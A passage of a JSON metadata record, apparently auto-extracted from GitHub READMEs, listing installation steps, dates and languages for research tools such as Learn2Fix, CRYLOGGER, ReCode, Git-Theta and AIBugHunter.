                    "value": "We have assembled a replication package that includes a **comprehensive SATD dataset**, comprised of 5,000 commit messages and 5,000 pull request sections gathered from 103 Apache open-source projects. Each entry is labeled as either non-SATD or with a specific type of SATD. Additionally, the package contains the **trained SATD detector** model to facilitate further research and analysis.\n```\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 SATD Detector\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 requirements.txt\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 satd_detector.py\n\u251c\u2500\u2500 SATD Keyowrds\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 SATD Keyowrds for different types of SATD\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Keywords for code or design debt.txt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Keywords for documentation debt.txt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Keywords for requirement debt.txt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 Keywords for test debt.txt\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 SATD Keywords for different sources\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Keywords for code comments.txt\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Keywords for commit messages.txt\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Keywords for issues.txt\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 Keywords for pull requests.txt\n\u251c\u2500\u2500 satd-dataset-code_comments.csv\n\u251c\u2500\u2500 satd-dataset-commit_messages.csv\n\u251c\u2500\u2500 satd-dataset-issues.csv\n\u2514\u2500\u2500 satd-dataset-pull_requests.csv\n```\n \n",
                    "original_header": "Structure of the Replication Package"
                },
                "confidence": 0.999997248703186,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yikun-li/satd-different-sources-data/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Latest version available on [arXiv](https://arxiv.org/abs/2202.02387) \n",
                    "original_header": "Paper"
                },
                "confidence": 0.9926709977607804,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yikun-li/satd-different-sources-data/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-05-23T15:04:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-16T21:41:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 9986
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "78": {
        "filename": "mboehme_learn2fix_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mboehme/learn2fix",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Set up a docker container for GenProg repair tool\n```bash\ndocker pull squareslab/genprog\ndocker run -it squareslab/genprog /bin/bash\n```\n\nDownload and set up any dependencies\n```bash\napt-get update\napt-get -y install git time build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev wget z3 bc\n\n# Install python\npushd /tmp\nwget https://www.python.org/ftp/python/3.7.2/Python-3.7.2.tar.xz\ntar -xf Python-3.7.2.tar.xz\ncd Python-3.7.2\n./configure --enable-optimizations\nmake -j4\nmake altinstall\nln -s $(which pip3.7) /usr/bin/pip\nmv /usr/bin/python /usr/bin/python.old\nln -s $(which python3.7) /usr/bin/python\npopd\n```\n\nDownload and set up the Codeflaws benchmark inside the container\n```bash\ncd /root\ngit clone https://github.com/codeflaws/codeflaws\ncd codeflaws/all-script\nwget http://www.comp.nus.edu.sg/~release/codeflaws/codeflaws.tar.gz\ntar -zxf codeflaws.tar.gz\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step-1. Install Codeflaws with GenProg",
                    "parent_header": [
                        "How to run Learn2Fix"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mboehme/learn2fix/master/README.md"
            },
            {
                "result": {
                    "value": "Download and compile Learn2Fix and its dependencies (e.g., INCAL)\n```bash\ncd /root/codeflaws/all-script\ngit clone https://github.com/mboehme/learn2fix\nexport learn2fix=\"$PWD/learn2fix\"\ncd $learn2fix\n# Install LattE\nwget https://github.com/latte-int/latte/releases/download/version_1_7_5/latte-integrale-1.7.5.tar.gz\ntar -xvzf latte-integrale-1.7.5.tar.gz\ncd latte-integrale-1.7.5\n./configure\nmake -j4\nmake install\n# Install Incal\ncd $learn2fix\npython setup.py build\npython setup.py install\npip install cvxopt\npip install plotting\npip install seaborn\npip install wmipa\npip install pywmi\npysmt-install --z3 #confirm with [Y]es\n```\n\nExport environment variables\n```bash\ncd $learn2fix\nexport PATH=/root/.opam/system/bin/:$PATH\nexport PATH=$PATH:$PWD/latte-integrale-1.7.5/dest/bin/\ncd $learn2fix/notebooks\nexport PYTHONPATH=$PWD/../incal/experiments\nexport PYTHONPATH=$PYTHONPATH:$PWD/../incal/extras\nexport PYTHONPATH=$PYTHONPATH:$PWD/../incal\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Step-2. Install Learn2Fix",
                    "parent_header": [
                        "How to run Learn2Fix"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mboehme/learn2fix/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-12-09T05:24:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-04T16:40:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 300005
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 96662
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 21420
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "79": {
        "filename": "lucapiccolboni_crylogger_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lucapiccolboni/crylogger",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Once you satisfy the requirements of the AOSP, it is sufficient to run the following command to setup the emulator and *CRYLOGGER*:\n\n```bash\ncd scripts/setup\n./setup_emu.py\n```\n\nThis scripts downloads the AOSP in a new directory `android-emu` from the official Google repositories, installs *CRYLOGGER* by copying the files from the directory `scripts/deltas`, and builds it. Please refer to the scripts in the directory `scripts/setup` for more information. By default, it uses all the available cores to compile the AOSP.\n\nIn addition, if you want to install apps from the Google Play Store, you need to install the [OpenGApps](https://github.com/opengapps/opengapps). You can do so by running the following commands:\n\n```bash\ncd scripts/setup\n./setup_opengapps.sh\n```\n\nThe OpenGApps (*x86-9.0-super-20210127*) are downloaded in `script/opengapps` so they can be installed on the emulator.\n\n***\n",
                    "type": "Text_excerpt",
                    "original_header": "Emulator Setup"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/lucapiccolboni/crylogger/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You are now ready to run your app on the Android emulator and collect the log that contains information about the crypto APIs that are invoked. We call this log *\"cryptolog\"*. Here, we verify a simple Android app that you can find in the directory `app-test`. If you have your own APK to test, you can skip the compilation of `app-test`, otherwise:\n```bash\ncd app-test\n./gradlew build\n```\nIf the compilation is successfull, you should find a file named `com.example.aes_0.apk` in the folder `test-app` that points to the APK of the test app. If you use your APK, make sure you use the following naming convention: `<package_name>_<version>.apk`, where `<package_name>` is the package name of the Android app and `<version>` is its version number. Copy the APK in the directory `scripts/data/apks`:\n```bash\ncp app-test/com.example.aes_0.apk scripts/data/apks/\n```\nYou need to start the emulator by passing the option `-writable-system` (this option is only used to install the OpenGApps):\n```bash\n# Setup the env variables\ncd android-emu\nsource build/envsetup.sh\nlunch sdk_phone_x86-userdebug\n# Now start the emulator\nemulator -writable-system\n```\n \n",
                    "original_header": "Verify your App"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lucapiccolboni/crylogger/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The emulator should be now running. Wait for the completion of the boot process, and then run the following script to execute your app:\n```bash\ncd scripts\npython run.py --work_dir data --session emulator-<number>\n```\n \nwhere `<number>` is the emulator session number (you can find it in the title bar of the emulator window). By default the script `run.py` (1) installs the OpenGApps, if they have not been installed in a previous run, (2) configures the  emulator, so that your app can be tested with Monkey, (3) installs your app on the emulator, (4) runs your app with Monkey by using a fixed number of user-interface events (default *100*), (5) collects the cryptolog, which contains information about the use of the crypto APIs, and (6) uninstalls the app. You can easily modify the script `run.py` if you want to use your own user-generated events.\n \n",
                    "original_header": "Collect the logs"
                },
                "confidence": 0.991790996704953,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lucapiccolboni/crylogger/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "After 'run.py' completes, you should find the log in the directory `scripts/data/crypto_logs`. Now you can analyze them by running the following command:\n```bash\ncd scripts\npython check.py --work_dir data/crypto_logs --rule_ID <number>\n```\nwhere `<number>` is the number of the crypto rule you want to check. *CRYLOGGER* support *26* rules that are explained in the paper as well as in the script `check.py`. These rules are suggested by cryptographers or organizations like [NIST](https://www.nist.gov/) and [IETF](https://www.ietf.org/). Try for example to check rule *R-03* by using the following command:\n```bash\ncd scripts\npython check.py --work_dir data/crypto_logs --rule_ID 03\n```\nYou should obtain a file with extension `.rules` in the directory `scripts/data/crypto_logs` that tells you if rule *R-03* is violated. For the app included in this repository the rule should be violated because the app performs encryptions and decryptions by using the insecure ECB mode. Note that some rules require two executions of your app, thus you need to run the script `run.py` twice. The second run should look like this:\n```bash\n# Start emulator\ncd android-emu\nemulator -writable-system\n# Run the script\ncd ../scripts\npython run.py --work_dir data --session emulator-<number> --suffix 2\n```\nThis command runs again your app on the emulator and appends `'2'` to the cryptolog files (extension `.cryptolog2` instead of simply `.cryptolog`). You can check rules that require two executions, for example rule *R-05* with the following command:\n```bash\ncd scripts\npython check.py --work_dir data/crypto_logs --rule_ID 05\n```\n \nIf you want to check all the rules supported by *CRYLOGGER*, omit the flag `--rule_ID`.\n \n",
                    "original_header": "Analyze the logs"
                },
                "confidence": 0.9557177182479657,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lucapiccolboni/crylogger/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-05-22T17:54:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-19T11:52:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 500188
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 52058
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4386
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "80": {
        "filename": "amazon-science_recode_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/amazon-science/recode",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We are using python 3.8, cuda 11.6. Anaconda would be recommended. Please run the following commands for installation.\n```\nconda deactivate; conda env remove --name ReCode\nconda create --name ReCode python=3.8\nconda activate ReCode\n```\n\nInstalling huggingface for model inference\n```\npip install transformers==4.21.1\npip install -U torch==1.11.0+cu113 -f https://download.pytorch.org/whl/torch_stable.html\n```\n\nInstalling humaneval. Need to enable humaneval by uncommenting out execution line `exec(check_program, exec_globals)` in `execution.py`.\n```\ncd evaluate-public-models\ngit clone https://github.com/openai/human-eval\npip install -e human-eval\ncd ..\n```\n\nInstalling nlaugmenter for perturbations\n```\ncd nlaugmenter\npip install -r requirements.txt\npip install https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-3.0.0/en_core_web_sm-3.0.0.tar.gz\ncd ..\n```\n\nInstalling treesitter for perturbations. Note that we customized our code syntax perturbatons based on [natgen](https://github.com/saikat107/NatGen). \n```\ncd natgen/treesitter\ngit clone https://github.com/tree-sitter/tree-sitter-python # clone the py-tree-sitter\npython build.py # build my-languages.so file\ncd ../transformations\nln -s ../treesitter/build/my-languages.so ./\npip install sympy\ncd ../..\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "ReCode: Robustness Evaluation of Code Generation Models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/amazon-science/recode/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-12-19T22:14:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-07T08:09:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 627972
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2483
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "81": {
        "filename": "r-three_git-theta_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/r-three/git-theta",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Download and install Git LFS using the instructions from [the Git LFS website](https://git-lfs.github.com).\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Git LFS",
                    "parent_header": [
                        "Quick Start"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "value": "1) Install the git-theta Python package:\n```bash\npip install git-theta\n```\n\nBy default, installing `git-theta` with `pip` will not install any of the supported machine learning frameworks (PyTorch, TensorFlow, etc.).\nIf you want to install the framework you intend to use when installing `git-theta`, you can specify it when installing (e.g. by running `pip install git-theta[pytorch]` for PyTorch).\n\n2) Configure Git to use Git-Theta when tracking model checkpoints:\n```bash\ngit theta install\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Git-Theta",
                    "parent_header": [
                        "Quick Start"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "value": "This project uses `black` for code formatting and `isort` for import statement ordering. Additionally, it includes CI that checks for compliance.\nWe include pre-commit hooks that will automatically run `black` and `isort` against any python files staged for commit.\n These hooks can be installed with:\n\n```bash\n$ pip install -r requirements-dev.txt\n$ pre-commit install\n```\n\nWhen one of these tools must reformat your file, it will show as the pre-commit hook failing and your commit will be cancelled.\nReformatted source files will appear in your working directory ready to be re-added to staging (`git add`).\n Running `git commit -m ${msg}` again will result in the hooks passing and the commit actually happening. *Note:* As your initial commit was blocked, you will probably want to use the same message in the commit that actually goes through.\n",
                    "type": "Text_excerpt",
                    "original_header": "Development Setup"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://user-images.githubusercontent.com/417568/229904559-d61d710c-7986-4a07-a405-d86b196f5046.png\" width=\"50\"> \nGit-Theta is a Git extension for collaborative, continual, and communal development of machine learning models. \n",
                    "original_header": "Git-Theta"
                },
                "confidence": 0.9814104694295984,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "After saving update information in the checkpoint, the new checkpoint can be committed simply using `git add` and `git commit` as usual.\n \n",
                    "original_header": "Saving update information as new parameter groups"
                },
                "confidence": 0.99947514278692,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Note that using this approach requires using `git theta add` instead of just `git add` to allow for additional command line arguments.\nUpdates that involve modifying existing parameters (rather than just completely replacing them) are referred to by Git-Theta as \"incremental updates\" and are handled via a plugin system (described [below](#incremental-updates)).\n \n",
                    "original_header": "Using Git-Theta to incorporate external update information"
                },
                "confidence": 0.999999928866205,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If different versions of a model are created on different branches or repositories, Git-Theta will handle merging them.\nWhen `git merge` is run and there is a merge conflict between two histories of a model, Git-Theta will automatically open its merge tool.\nGit-Theta's merge tool currently supports basic resolution patterns like choosing the parameters from one of the models or merging parameter groups via averaging.\nFor more sophisticated merges, the environment variable `GIT_THETA_MANUAL_MERGE` can be set to true when performing the merge operation, i.e.\n```bash\nexport GIT_THETA_MANUAL_MERGE=True\ngit merge ${other-branch}\n```\n \n",
                    "original_header": "Merging models"
                },
                "confidence": 0.982526049647078,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Git-Theta aims to support all standard Git workflows.\nHowever, there are currently some situations that Git-Theta does not currently support.\n \n",
                    "original_header": "Sharp Edges"
                },
                "confidence": 0.9954162621255966,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This section describes how Git-Theta works in more detail.\n \n",
                    "original_header": "Under the hood"
                },
                "confidence": 0.9327059055980781,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. The Git-Theta metadata file is retrieved from Git.\n2. For each parameter, the [Update](https://github.com/r-three/git-theta/tree/main/git_theta/updates) plug-in system is used to get actual parameter values.\n  a. For updates that change all parameter values, the Git LFS metadata is used to get the values directly.\n  b. For parameter-efficient updates, Git LFS metadata is used to get update values, previous parameter values are retrieved from Git itself, and the update is applied.\n4. The parameter values are written into the working tree using the checkpoint plug-in system to handle different deep learning frameworks. \nWhen installing Git-Theta with `git theta install`, the following lines are added to the global `~/.gitconfig`:\n```ini\n[filter \"theta\"]\n    clean = git-theta-filter clean %f\n    smudge = git-theta-filter smudge %f\n    required = true\n[merge \"theta\"]\n    name = Merge Models with Git-Theta\n    driver = git-theta-merge %O %A %B %P\n[diff \"theta\"]\n    command = git-theta-diff\n```\nThis configuration defines two [Git filter drivers](https://git-scm.com/docs/gitattributes#_filter) for Git-Theta and registers them under the name `theta`.\nIn addition, it defines merge and diff programs, also named `theta`.\nWhen `git theta track path/to/model` is run, an entry is added to the `.gitattributes` file to configure Git to use Git-Theta. The new entry looks like\n```ini\npath/to/model filter=theta merge=theta diff=theta\n```\n \n",
                    "original_header": "Git-Theta's filters"
                },
                "confidence": 0.9953695340540436,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Git-theta makes heavy use of [python plug-ins](https://packaging.python.org/en/latest/guides/creating-and-discovering-plugins/) to enable users to add support for additional checkpoint formats as well as custom merge patterns and incremental updates.\nSpecifically, Git-Theta currently support plug-ins for the [`Checkpoint`](https://github.com/r-three/git-theta/blob/main/git_theta/checkpoints/base.py), [`Update`](https://github.com/r-three/git-theta/blob/main/git_theta/updates/base.py), and [`Merge`](https://github.com/r-three/git-theta/blob/main/git_theta/merges/base.py) classes.\nThird-party users can register a plug-in by creating a small installable package that defines the plugin and registers it as an entry point under the name scope `git_theta.plugins.(checkpoints|updates|merges)`.\nAn example plugin for JSON formatted checkpoints can be found [here](https://github.com/r-three/git-theta/tree/main/plugins#git-theta-plug-ins).\nAlternatively, plug-ins can be added directly to the `git-theta` package by adding new subclasses to the appropriate modules, then declaring it in the `entry_points` dict in `setup.py`.\n \n",
                    "original_header": "Plug-ins"
                },
                "confidence": 0.9999999757693562,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/r-three/git-theta/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-02-09T20:55:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T13:36:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 198752
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16347
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "82": {
        "filename": "SNTSVV_SEDE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SNTSVV/SEDE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-09-20T07:40:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-26T08:19:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1006861
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "83": {
        "filename": "OPTML-Group_CLAW-SAT_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OPTML-Group/CLAW-SAT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "See the [readme from our ICLR 2021 work](https://github.com/ALFA-group/adversarial-code-generation) for details on setting up the basic training pipeline.\n",
                    "type": "Text_excerpt",
                    "original_header": "Setting up training pipeline",
                    "parent_header": [
                        "CLAWSAT: Towards Both Robust and Accurate Code Models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/OPTML-Group/CLAW-SAT/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you face issues running this codebase, please [open an issue](https://github.com/ALFA-group/adversarial-code-generation/issues) on this repository, and mention as much information to reproduce your issue, including the exact command you have run, the configurations that you have used, the output you see, etc.\nSee [posts like these](https://medium.com/nyc-planning-digital/writing-a-proper-github-issue-97427d62a20f) which describe how to communicate problems effectively via Github issues. \n",
                    "original_header": "Authors"
                },
                "confidence": 0.9998191452627986,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OPTML-Group/CLAW-SAT/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The instructions that follow have been adopted from [Ramakrishnan et al.'s codebase](https://github.com/jjhenkel/averloc).\nIn this repository, we have the following directories:\n \n",
                    "original_header": "Directory Structure"
                },
                "confidence": 0.9981198125691245,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OPTML-Group/CLAW-SAT/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This directory contains dependencies in the form of git submodukes.\n \n",
                    "original_header": "`./vendor`"
                },
                "confidence": 0.9251544124736357,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OPTML-Group/CLAW-SAT/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-12-13T04:01:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-03T16:22:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1866620
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1773752
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 357830
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 100148
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 85970
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 28462
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 21394
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 21236
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 1567
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "84": {
        "filename": "awsm-research_AIBugHunter_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/awsm-research/AIBugHunter",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "<details open=\"open\">\n  <summary></summary>\n  \nFirst of all, clone this repository to your local machine and access the main dir via the following command:\n```\ngit clone https://github.com/awsm-research/AIBugHunter.git\ncd AIBugHunter\n```\n\nThen, install the python dependencies via the following command:\n```\npip install numpy\npip install torch\npip install transformers\npip install tqdm\npip install pandas\npip install scikit-learn\npip install argparse\npip install gdown\n```\n\nAlternatively, we provide requirements.txt with version of packages specified to ensure the reproducibility,\nyou may install via the following commands:\n```\npip install -r requirements.txt\n```\n\nIf having an issue with the gdown package, try the following commands:\n```\ngit clone https://github.com/wkentaro/gdown.git\ncd gdown\npip install .\ncd ..\n```\n\n* We highly recommend you check out this <a href=\"https://pytorch.org/\">installation guide</a> for the \"torch\" library so you can install the appropriate version on your device.\n  \n* To utilize GPU (optional), you also need to install the CUDA library, you may want to check out this <a href=\"https://docs.nvidia.com/cuda/cuda-quick-start-guide/index.html\">installation guide</a>.\n  \n* <a href=\"https://www.python.org/downloads/release/python-397/\">Python 3.9.7</a> is recommended, which has been fully tested without issues.\n \n</details>\n  ",
                    "type": "Text_excerpt",
                    "original_header": "About the Environment Setup",
                    "parent_header": [
                        "How to replicate"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/awsm-research/AIBugHunter/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the following command to retrain:\n```\ncd rq1_cwe_id_cls/mo_bert\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH3* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/codebert_base\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH5* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/bert_base\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH7* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/bow_rf\npython rf_main.py\n```\nRun the following command to download the pre-trained model:\nBASH9* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/naive_bayes\npython naive_bayes_main.py\n```\nRun the following command to download the pre-trained model:\nBASH11* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/mo_bert\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH3*\nNote. Since our approach is a multi-task learning approach, the model is the same as the one used in RQ1. \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/bert_baseline\nsh train_codebert.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH13* \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/bert_baseline\nsh 